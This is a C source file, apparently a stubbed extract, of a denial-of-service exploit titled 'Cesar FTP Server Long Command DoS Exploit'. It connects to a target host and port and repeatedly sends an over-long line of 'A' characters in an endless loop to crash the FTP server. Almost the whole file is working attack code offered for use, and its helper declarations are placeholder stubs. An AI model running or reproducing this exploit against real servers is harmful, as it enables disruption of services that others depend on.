
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int WSADATA ;
typedef scalar_t__ SOCKET ;


 int BUFFSIZE ;
 int MAKEWORD (int,int) ;
 int SIZE ;
 int Sleep (int) ;
 int WSACleanup () ;
 int WSAStartup (int ,int *) ;
 int atoi (char*) ;
 int client_connect (scalar_t__,char*,int ) ;
 int closesocket (scalar_t__) ;
 scalar_t__ create_socket () ;
 int exit (int) ;
 int memset (char*,char,int) ;
 int printf (char*,...) ;
 int readbuf (char*,scalar_t__,int ,int) ;
 int recvbuf ;
 char* sendbuf ;
 int show ;
 int writebuf (char*,scalar_t__,char*,int) ;

void main(int argc, char *argv[])
{
WSADATA wsa;
unsigned short port;
unsigned long ip;

SOCKET s;
int size = SIZE;

printf("Cesar FTP Server Long Command DoS Exploit\r\n");
printf("lion lion#cnhonker.net, http://www.cnhonker.com\r\n\n");

if(argc < 3)
{
printf("%s <TargetHost> <TargetPort>\r\n", argv[0]);
return;
}

WSAStartup(MAKEWORD(2,2),&wsa);

if((s=create_socket())==0)
{
printf("[-] ERROR: Create socket failed.\r\n");
return;
}

if(!client_connect(s, argv[1], atoi(argv[2])))
exit(-1);

readbuf("read", s, recvbuf, BUFFSIZE);

memset(sendbuf, 0, BUFFSIZE);
memset(sendbuf, 'A', size);

sendbuf[size-2] ='\r';
sendbuf[size-1] ='\n';

while(1)
{
show=1;
writebuf("Send Buff", s, sendbuf, size);
readbuf("read", s, recvbuf, BUFFSIZE);
Sleep(1000);
}

if(s)
closesocket(s);

WSACleanup();
}
